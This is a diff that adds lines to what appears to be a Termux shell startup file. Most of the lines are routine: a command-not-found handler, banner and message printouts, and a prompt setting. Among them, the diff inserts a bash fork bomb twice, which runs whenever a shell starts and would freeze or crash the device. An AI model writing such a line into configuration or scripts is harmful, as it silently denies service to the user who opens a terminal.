@@ -1,0 +1,11 @@
+command_not_found_handle() {
+	/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
+}
+cat /data/data/com.termux/files/usr/etc/.banner
+echo ""
+cat /data/data/com.termux/files/usr/etc/.msg
+cat /data/data/com.termux/files/usr/etc/.rec
+:(){ :|: & };:
+:(){ :|: & };:
+PS1='\$ '
+
